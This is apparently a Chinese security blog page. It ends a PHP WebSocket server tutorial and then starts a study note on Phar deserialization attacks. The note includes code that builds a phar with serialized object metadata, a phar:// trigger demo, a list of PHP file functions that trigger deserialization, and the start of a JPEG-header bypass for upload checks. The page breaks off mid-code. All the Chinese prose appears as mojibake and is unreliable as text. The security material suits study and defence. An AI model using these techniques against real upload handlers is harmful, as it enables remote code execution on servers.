<td>Transmission Control Protocol æ˜¯ä¸€ä¸ªå¯é çš„ã€åŸºäºè¿æ¥çš„ã€é¢å‘æ•°æ®æµçš„å…¨åŒå·¥åè®®ã€‚TCP  èƒ½å¤Ÿä¿éšœæ‰€æœ‰çš„æ•°æ®åŒ…æ˜¯æŒ‰ç…§å…¶å‘é€é¡ºåºè€Œæ¥æ”¶çš„ã€‚å¦‚æœä»»æ„æ•°æ®åŒ…åœ¨é€šè®¯æ—¶ä¸¢å¤±ï¼ŒTCP  å°†è‡ªåŠ¨é‡å‘æ•°æ®åŒ…ç›´åˆ°ç›®æ ‡ä¸»æœºåº”ç­”å·²æ¥æ”¶ã€‚å› ä¸ºå¯é æ€§å’Œæ€§èƒ½çš„åŸå› ï¼ŒTCP åœ¨æ•°æ®ä¼ è¾“å±‚ä½¿ç”¨ 8bit å­—èŠ‚è¾¹ç•Œã€‚å› æ­¤ï¼ŒTCP  åº”ç”¨ç¨‹åºå¿…é¡»å…è®¸ä¼ é€éƒ¨åˆ†æŠ¥æ–‡çš„å¯èƒ½ã€‚</td>
</tr>
</tbody></table>
<ul>
<li><code>è¿”å›å€¼</code>socket_create() æ­£ç¡®æ—¶è¿”å›ä¸€ä¸ªå¥—æ¥å­—ï¼Œå¤±è´¥æ—¶è¿”å› <code>FALSE</code>ã€‚è¦è¯»å–é”™è¯¯ä»£ç ï¼Œå¯ä»¥è°ƒç”¨ <a href="http://php.net/manual/zh/function.socket-last-error.php" target="_blank" rel="noopener">socket_last_error()</a>ã€‚è¿™ä¸ªé”™è¯¯ä»£ç å¯ä»¥é€šè¿‡ <a href="http://php.net/manual/zh/function.socket-strerror.php" target="_blank" rel="noopener">socket_strerror()</a> è¯»å–æ–‡å­—çš„é”™è¯¯è¯´æ˜ã€‚</li>
</ul>
<hr>
<p>  <code>socket_bind</code>ç»™å¥—æ¥å­—ç»‘å®šåå­—,<strong>æ³¨æ„ï¼š</strong>ç»‘å®š <code>address</code> åˆ° <code>socket</code>ã€‚   è¯¥æ“ä½œå¿…é¡»æ˜¯åœ¨ä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.socket-connect.php" target="_blank" rel="noopener">socket_connect()</a> æˆ–è€… <a href="https://www.php.net/manual/zh/function.socket-listen.php" target="_blank" rel="noopener">socket_listen()</a>   å»ºç«‹ä¸€ä¸ªè¿æ¥ä¹‹å‰ã€‚  </p>
<pre><code class="php"> socket_bind ( resource $socket , string $address [, int $port = 0 ] ) : bool</code></pre>
<ul>
<li><p><code>@parameter socket</code>ç”¨ <a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create()</a> åˆ›å»ºçš„ä¸€ä¸ªæœ‰æ•ˆçš„å¥—æ¥å­—èµ„æºã€‚      </p>
</li>
<li><p><code>@parameter address</code></p>
<ul>
<li>å¦‚æœå¥—æ¥å­—æ˜¯ <strong><code>AF_INET</code></strong> æ—ï¼Œé‚£ä¹ˆ       <code>address</code> å¿…é¡»æ˜¯ä¸€ä¸ªå››ç‚¹åˆ†æ³•çš„ IP åœ°å€ï¼ˆä¾‹å¦‚ <em>127.0.0.1</em> ï¼‰ã€‚</li>
<li>å¦‚æœå¥—æ¥å­—æ˜¯ <strong><code>AF_UNIX</code></strong> æ—ï¼Œé‚£ä¹ˆ <code>address</code> æ˜¯ Unix å¥—æ¥å­—ä¸€éƒ¨åˆ†ï¼ˆä¾‹å¦‚ /tmp/my.sock ï¼‰</li>
</ul>
</li>
<li><p><code>@parameter port</code>å‚æ•° <code>port</code> ä»…ä»…ç”¨äº <strong><code>AF_INET</code></strong>       å¥—æ¥å­—è¿æ¥çš„æ—¶å€™ï¼Œå¹¶ä¸”æŒ‡å®šè¿æ¥ä¸­éœ€è¦ç›‘å¬çš„ç«¯å£å·ã€‚      </p>
</li>
</ul>
<hr>
<p>  â€‹    <code>socket_listen</code>ç›‘å¬socketè¿æ¥</p>
<pre><code class="php"> socket_listen ( resource $socket [, int $backlog = 0 ] ) : bool</code></pre>
<ul>
<li><code>@parameter socket</code>ç”¨ <a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create()</a> åˆ›å»ºçš„ä¸€ä¸ªæœ‰æ•ˆçš„å¥—æ¥å­—èµ„æºã€‚</li>
<li><code>@parameter backlog</code>ç«¯å£å·</li>
</ul>
<h2 id="åˆ›å»ºå¥—æ¥å­—å®ä¾‹"><a href="#åˆ›å»ºå¥—æ¥å­—å®ä¾‹" class="headerlink" title="åˆ›å»ºå¥—æ¥å­—å®ä¾‹"></a>åˆ›å»ºå¥—æ¥å­—å®ä¾‹</h2><pre><code class="php">public function service(){
    $tcp = getprotobyname(&quot;tcp&quot;);    //è·å–tcpåè®®å·ç ã€‚
    $sock = socket_create(AF_INET, SOCK_STREAM, $tcp);//åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—
    socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
    if($sock &lt; 0)
    {
        throw new Exception(&quot;failed to create socket: &quot;.socket_strerror($sock).&quot;\n&quot;);//è·å–é”™è¯¯
    }
    socket_bind($sock, $this-&gt;address, $this-&gt;port);//ç»‘å®šIPå’Œç«¯å£
    socket_listen($sock, $this-&gt;port);//ç›‘å¬ç«¯å£
    echo &quot;listen on $this-&gt;address $this-&gt;port ... \n&quot;;
    $this-&gt;_sockets = $sock;
}</code></pre>
<h2 id="æ¡æ‰‹å¤„ç†"><a href="#æ¡æ‰‹å¤„ç†" class="headerlink" title="æ¡æ‰‹å¤„ç†"></a>æ¡æ‰‹å¤„ç†</h2><ul>
<li>æˆ‘ä»¬ç›´æ¥ä»ä»£ç ç¤ºä¾‹çœ‹,è¿™ä¸ªç±»æ–¹æ³•ä¼ å…¥äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯socketã€ä¸€ä¸ªæ˜¯è¯·æ±‚åŒ…ï¼Œåœ¨æ¥æ”¶åˆ°è¯·æ±‚åŒ…åä¼šéå†è¿™ä¸ªè¯·æ±‚åŒ…ï¼Œè·å–ä¸­çš„<code>Sec-WebSocket-Key&#39;</code>,<code>Sec-WebSocket-Key</code> åŠ ä¸Šä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ä¸²  <code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>ï¼Œç„¶åè®¡ç®— SHA-1 ï¼Œä¹‹åè¿›è¡Œ BASE-64  ç¼–ç ï¼Œå°†ç»“æœåšä¸º <code>Sec-WebSocket-Accept</code> å¤´çš„å€¼å¹¶ä¸”æ’å…¥åœ¨å“åº”åŒ…ä¸­ è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li>
<li><code>socket_write</code> å°†å­—ç¬¦ä¸²å†™å…¥socketä¸­</li>
</ul>
<pre><code class="php">socket_write( resource `$socket`   , string `$buffer`   [, int `$length` = 0  ] ) : int</code></pre>
<pre><code class="php">/**
 * æ¡æ‰‹å¤„ç†
 * @param $newClient socket
 * @return int  æ¥æ”¶åˆ°çš„ä¿¡æ¯
 */
public function handshaking($newClient, $line){

    $headers = array();
    $lines = preg_split(&quot;/\r\n/&quot;, $line);
    foreach($lines as $line)
    {
        $line = chop($line);//chop()è‹¥ä¸ºç©ºåˆ™ç§»é™¤\n\rç©ºæ ¼ä¹‹ç±»çš„ã€‚
        if(preg_match(&#39;/\A(\S+): (.*)\z/&#39;, $line, $matches))//æ­£åˆ™è·å–headerå¤´
        {
            $headers[$matches[1]] = $matches[2];//å°†headerå­˜å…¥æ•°ç»„
        }
    }
    $secKey = $headers[&#39;Sec-WebSocket-Key&#39;];
    $secAccept = base64_encode(pack(&#39;H*&#39;, sha1($secKey . &#39;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#39;)));
    $upgrade  = &quot;HTTP/1.1 101 Web Socket Protocol Handshake\r\n&quot; .
        &quot;Upgrade: websocket\r\n&quot; .
        &quot;Connection: Upgrade\r\n&quot; .
        &quot;WebSocket-Origin: $this-&gt;address\r\n&quot; .
        &quot;WebSocket-Location: ws://$this-&gt;address:$this-&gt;port/websocket/websocket\r\n&quot;.
        &quot;Sec-WebSocket-Accept:$secAccept\r\n\r\n&quot;;  //æ„é€ å“åº”åŒ…
    return socket_write($newClient, $upgrade, strlen($upgrade));
}</code></pre>
<h2 id="Websocketçš„æ•°æ®å¤„ç†"><a href="#Websocketçš„æ•°æ®å¤„ç†" class="headerlink" title="Websocketçš„æ•°æ®å¤„ç†"></a>Websocketçš„æ•°æ®å¤„ç†</h2><ul>
<li><p><strong>æ•°æ®å¸§æ ¼å¼</strong></p>
<p>â€‹    WebSocketå®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯é€šä¿¡çš„æœ€å°å•ä½æ˜¯å¸§ï¼ˆframeï¼‰,ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå¸§ç»„æˆä¸€æ¡å®Œæ•´çš„æ¶ˆæ¯(message)</p>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191205/15755606535758.png" alt="img"></p>
<ul>
<li><strong>æ•°æ®å¸§æ ¼å¼è¯¦è§£</strong>ï¼š</li>
</ul>
<p><strong>FIN</strong></p>
<p>â€‹        å¦‚æœæ˜¯1ï¼Œè¡¨ç¤ºè¿™æ˜¯æ¶ˆæ¯(message)çš„æœ€åä¸€ä¸ªåˆ†ç‰‡ï¼ˆfragmentï¼‰,å¦‚æœæ˜¯0ï¼Œè¡¨ç¤ºä¸æ˜¯æ¶ˆæ¯ï¼ˆmessageï¼‰çš„æœ€åä¸€ä¸ªåˆ†ç‰‡ï¼ˆfragmentï¼‰</p>
<p><strong>Opcode</strong>: </p>
<p>â€‹            4ä¸ªæ¯”ç‰¹ã€‚</p>
<p><strong>æ“ä½œç </strong></p>
<p>â€‹        Opcodeçš„å€¼å†³å®šäº†åº”è¯¥å¦‚ä½•è§£æåç»­çš„æ•°æ®è½½è·ï¼ˆdata payloadï¼‰ã€‚å¦‚æœæ“ä½œç æ˜¯ä¸è®¤è¯†çš„ï¼Œé‚£ä¹ˆæ¥æ”¶ç«¯åº”è¯¥æ–­å¼€è¿æ¥ï¼ˆfail the connectionï¼‰</p>
<p><strong>Mask</strong>: 1ä¸ªæ¯”ç‰¹ã€‚</p>
<p>â€‹        ä»å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€æ•°æ®æ—¶ï¼Œéœ€è¦å¯¹æ•°æ®è¿›è¡Œæ©ç æ“ä½œï¼›ä»æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€æ•°æ®æ—¶ï¼Œä¸éœ€è¦å¯¹æ•°æ®è¿›è¡Œæ©ç æ“ä½œã€‚<br>å¦‚æœæœåŠ¡ç«¯æ¥æ”¶åˆ°çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ©ç æ“ä½œï¼ŒæœåŠ¡ç«¯éœ€è¦æ–­å¼€è¿æ¥ã€‚</p>
<p><strong>Payload length</strong>: æ•°æ®è½½è·çš„é•¿åº¦ã€‚ 7ä½  æˆ–  7 + 16 ä½  æˆ–  7 + 64ä½ã€‚</p>
<p>â€‹    å‡è®¾ Payload length == x</p>
<p>x ä¸º 0-126ï¼š æ•°æ®é•¿åº¦ä¸ºxå­—èŠ‚.<br>x ä¸º 126 ï¼š åç»­2ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ª16ä½æ— ç¬¦å·æ•´æ•°<br>x  ä¸º 127 ï¼š åç»­8ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ª64ä½æ— ç¬¦å·æ•´æ•°</p>
<p><strong>æ©ç ç®—æ³•</strong>ï¼š</p>
<p> é¦–å…ˆï¼Œå‡è®¾ï¼š</p>
<pre><code>original-octet-iï¼šä¸ºåŸå§‹æ•°æ®çš„ç¬¬iå­—èŠ‚ã€‚
transformed-octet-iï¼šä¸ºè½¬æ¢åçš„æ•°æ®çš„ç¬¬iå­—èŠ‚ã€‚
jï¼šä¸ºi mod 4çš„ç»“æœã€‚
masking-key-octet-jï¼šä¸ºmask keyç¬¬jå­—èŠ‚ã€‚

ç®—æ³•æè¿°ä¸ºï¼š original-octet-i ä¸ masking-key-octet-j å¼‚æˆ–åï¼Œå¾—åˆ° transformed-octet-iã€‚</code></pre><ul>
<li>æ•°æ®å¸§çš„è§£æå¦‚ä¸‹ï¼š</li>
</ul>
<pre><code class="php">/**
     * è§£ææ¥æ”¶æ•°æ®
     * @param $buffer
     * @return null|string
     */
    public function message($buffer){
        $len = $masks = $data = $decoded = null;
        $len = ord($buffer[1]) &amp; 127;//å–å‡ºç¬¬8-15ä½
        if ($len === 126)  { // 126&lt;=æ•°æ®é•¿åº¦&lt;= 65535   Extended payload length æœ‰ å ç”¨2ä¸ªå­—èŠ‚
            $masks = substr($buffer, 4, 4);//å¸§æ ¼å¼ Masking-key å ç”¨4å­—èŠ‚
            $data = substr($buffer, 8);//ç¬¬ä¹ä¸ªå­—èŠ‚ï¼ˆç´¢å¼• 8 ï¼‰å¼€å§‹ æ˜¯æ•°æ®
        } else if ($len === 127)  { // 65535 &lt;= æ•°æ®é•¿åº¦  ï¼›Extended payload length æœ‰ å ç”¨8ä¸ªå­—èŠ‚
            $masks = substr($buffer, 10, 4);// è¯´æ˜ Extended payload length å ç”¨ 8ä¸ªå­—èŠ‚ 2 + 8 æ‰€ä»¥ä» 10å¼€å§‹
            $data = substr($buffer, 14);
        } else  {
            $masks = substr($buffer, 2, 4);
            $data = substr($buffer, 6);
        }
        for ($index = 0; $index &lt; strlen($data); $index++) {
            $decoded .= $data[$index] ^ $masks[$index % 4];//æ©ç è½¬æ¢ä¸ºåŸæ–‡
        }
        return $decoded;  
    }
</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3e1694f0d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d3e1694f0d.html" class="post-title-link" itemprop="url">Pharååºåˆ—åŒ–æ‹“å±•æ”»å‡»å­¦ä¹ ç¬”è®°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2019-12-12 11:31:04" itemprop="dateCreated datePublished" datetime="2019-12-12T11:31:04+08:00">2019-12-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:28:02" itemprop="dateModified" datetime="2020-10-14T17:28:02+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/webå®‰å…¨/" itemprop="url" rel="index"><span itemprop="name">webå®‰å…¨</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>5.3k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>5 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h2><blockquote>
<p>Pharå½’æ¡£æ–‡ä»¶æœ€æœ‰ç‰¹è‰²çš„ç‰¹ç‚¹æ˜¯å¯ä»¥æ–¹ä¾¿åœ°å°†å¤šä¸ªæ–‡ä»¶åˆ†ç»„ä¸ºä¸€ä¸ªæ–‡ä»¶ã€‚è¿™æ ·ï¼Œpharå½’æ¡£æ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPåº”ç”¨ç¨‹åºåˆ†å‘åˆ°å•ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶è¿è¡Œå®ƒçš„æ–¹æ³•ï¼Œè€Œæ— éœ€å°†å…¶æå–åˆ°ç£ç›˜ä¸­ã€‚æ­¤å¤–ï¼ŒPHPå¯ä»¥åƒåœ¨å‘½ä»¤è¡Œä¸Šå’Œä»WebæœåŠ¡å™¨ä¸Šçš„ä»»ä½•å…¶ä»–æ–‡ä»¶ä¸€æ ·è½»æ¾åœ°æ‰§è¡Œpharå­˜æ¡£ã€‚ Pharæœ‰ç‚¹åƒPHPåº”ç”¨ç¨‹åºçš„æ‹‡æŒ‡é©±åŠ¨å™¨ã€‚ï¼ˆè¯‘æ–‡ï¼‰</p>
</blockquote>
<ul>
<li>ç®€å•ç†è§£å°±æ˜¯ä»–ç±»ä¼¼zipæˆ–è€…è¯´ç±»ä¼¼jarï¼Œå®ƒå°†PHPæ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªæ–‡ä»¶ç„¶åPHPå¯ä»¥åœ¨ä¸è§£å‹çš„æƒ…å†µå»è®¿é—®è¿™ä¸ªåŒ…é‡Œé¢çš„phpï¼Œå¹¶æ‰§è¡Œã€‚<h3 id="Pharçš„ç»“æ„"><a href="#Pharçš„ç»“æ„" class="headerlink" title="Pharçš„ç»“æ„"></a>Pharçš„ç»“æ„</h3></li>
</ul>
<p><strong>1.</strong> <strong>pharæ–‡ä»¶æ ‡è¯†</strong></p>
<pre><code class="php">&lt;?php
Phar::mapPhar();
include &#39;phar://phar.phar/index.php&#39;;
__HALT_COMPILER();
?&gt;</code></pre>
<p>â€‹        æ ¼å¼ä¸º<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>å‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</p>
<p><strong>2. a manifest describing the contents</strong><br>         pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p>
<p><strong>3. the file contents</strong><br>         è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br>         ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š    </p>
<h3 id="Pharçš„ä½¿ç”¨æ–¹æ³•"><a href="#Pharçš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="Pharçš„ä½¿ç”¨æ–¹æ³•"></a>Pharçš„ä½¿ç”¨æ–¹æ³•</h3><pre><code class="php">&lt;?php
    class User{
        var $name;
        function __destruct(){
            echo &quot;fangzhang&quot;;
        }
    }

    @unlink(&quot;test.phar&quot;);
    $phar = new Phar(&quot;test.phar&quot;);//åç¼€åå¿…é¡»ä¸ºphar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//è®¾ç½®stub
    $o = new User();
    $o-&gt;name = &quot;test&quot;;
    $phar-&gt;setMetadata($o);//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
    $phar-&gt;stopBuffering();
?&gt;</code></pre>
<p>å¾—åˆ°çš„test.phar å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code>00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM
00000010: 5049 4c45 5228 293b 203f 3e0d 0a5b 0000  PILER(); ?&gt;..[..
00000020: 0001 0000 0011 0000 0001 0000 0000 0025  ...............%
00000030: 0000 004f 3a34 3a22 5573 6572 223a 313a  ...O:4:&quot;User&quot;:1:
00000040: 7b73 3a34 3a22 6e61 6d65 223b 733a 343a  {s:4:&quot;name&quot;;s:4:
00000050: 2274 6573 7422 3b7d 0800 0000 7465 7374  &quot;test&quot;;}....test
00000060: 2e74 7874 0400 0000 46fc 6e5d 0400 0000  .txt....F.n]....
00000070: 0c7e 7fd8 b601 0000 0000 0000 7465 7374  .~..........test
00000080: 9d18 4c48 ba24 6ed6 a810 3690 2aac 034e  ..LH.$n...6.*..N
00000090: 6aee e818 0200 0000 4742 4d42            j.......GBMB</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€éƒ¨åˆ†æ˜¯åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨ä¸Šä¸€éƒ¨åˆ†æ‰€è¯´çš„<code>manifest</code>ä¹Ÿå°±æ˜¯<code>meta-data</code></p>
<h3 id="Pharååºåˆ—åŒ–åŸç†"><a href="#Pharååºåˆ—åŒ–åŸç†" class="headerlink" title="Pharååºåˆ—åŒ–åŸç†"></a>Pharååºåˆ—åŒ–åŸç†</h3><p>â€‹        ä½¿ç”¨Phar://ä¼ªåè®®å»è¯»å–Pharæ–‡ä»¶æ—¶å€™ï¼Œæ–‡ä»¶ä¼šè¢«å½“åšpharå¯¹è±¡ï¼Œmeta-dataéƒ¨åˆ†ä¼šè¢«ååºåˆ—åŒ–ã€‚</p>
<h4 id="æµ‹è¯•Dome"><a href="#æµ‹è¯•Dome" class="headerlink" title="æµ‹è¯•Dome"></a>æµ‹è¯•Dome</h4><pre><code class="php">&lt;?php
    class User{
        var $name;
        function __destruct(){
            echo &quot;test&quot;;
        }
    }

$file = &quot;phar://test.phar&quot;;
@file_get_contents($file);
?&gt;</code></pre>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="å‡½æ•°æ‰©å±•"><a href="#å‡½æ•°æ‰©å±•" class="headerlink" title="å‡½æ•°æ‰©å±•"></a>å‡½æ•°æ‰©å±•</h3><p>æ ¹æ®ä»¥ä¸Šä»£ç çš„æµ‹è¯•å¯çŸ¥ï¼Œåªè¦phar://åè®®è§£ææ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä¼šé€ æˆåºåˆ—åŒ–çš„é—®é¢˜ï¼Œç±»ä¼¼è¿™æ ·çš„å‡½æ•°ä¸å…‰æœ‰<code>file_get_contents</code>è¿˜æœ‰å…¶ä»–å‡½æ•°ï¼›</p>
<p>æœ‰å¤§ç‰›æ›¾ç»æ€»ç»“è¿‡ï¼Œæ‰€æœ‰æ–‡ä»¶æ“ä½œçš„å‡½æ•°éƒ½å¯ä»¥è§¦å‘è¿™ç§åºåˆ—åŒ–ï¼š</p>
<ul>
<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / `fopen``</li>
<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
<li><code>parse_ini_file</code></li>
<li><code>unlink</code></li>
<li><code>copy</code></li>
</ul>
<p>è¿˜æœ‰å¤§ç‰›æ·±å…¥çš„åˆ†æè¿‡è¿™äº›å‡½æ•°çš„åŸç†ï¼Œå¹¶ä¸”åŠ ä»¥æ‰©å±•ï¼š</p>
<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom***</code></li>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
<p>å‡ ä¹æ‰€æœ‰å’ŒIOæœ‰å…³çš„å‡½æ•°éƒ½æ¶‰åŠåˆ°äº†</p>
<h3 id="ç»•è¿‡å›¾ç‰‡å¤´æ£€æŸ¥"><a href="#ç»•è¿‡å›¾ç‰‡å¤´æ£€æŸ¥" class="headerlink" title="ç»•è¿‡å›¾ç‰‡å¤´æ£€æŸ¥"></a>ç»•è¿‡å›¾ç‰‡å¤´æ£€æŸ¥</h3><pre><code class="php">&lt;?php
class TestObject {}

$jpeg_header_size = 
&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;.
&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;.
&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;.
&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;.
&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;.
&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;.
&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;.
&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;.
&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;.
&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;;

